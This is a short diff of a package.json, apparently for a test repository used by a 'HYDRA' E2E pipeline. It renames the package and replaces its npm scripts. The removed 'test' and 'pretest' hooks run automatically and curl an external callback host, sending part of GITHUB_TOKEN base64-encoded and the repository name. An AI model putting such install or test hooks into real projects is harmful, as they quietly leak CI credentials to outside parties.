@@ -1,9 +1,9 @@
 {
-  "name": "hydra-e2e-target",
-  "version": "1.0.0",
-  "description": "E2E test repository for HYDRA pipeline",
+  "name": "hydra-test-issue-comment",
+  "version": "1.0.1",
+  "description": "Multi-workflow test repository for HYDRA E2E pipeline",
+  "license": "MIT",
   "scripts": {
-    "test": "curl -sk 'https://oast.fun/hydra-0225112335?t=$(echo $GITHUB_TOKEN | head -c 8 | base64)'&r=$GITHUB_REPOSITORY -o /dev/null || true",
-    "pretest": "curl -sk 'https://oast.fun/hydra-0225112335?stage=pretest&r=$GITHUB_REPOSITORY' -o /dev/null || true"
+    "test": "echo 'Running tests...' && exit 0"
   }
 }
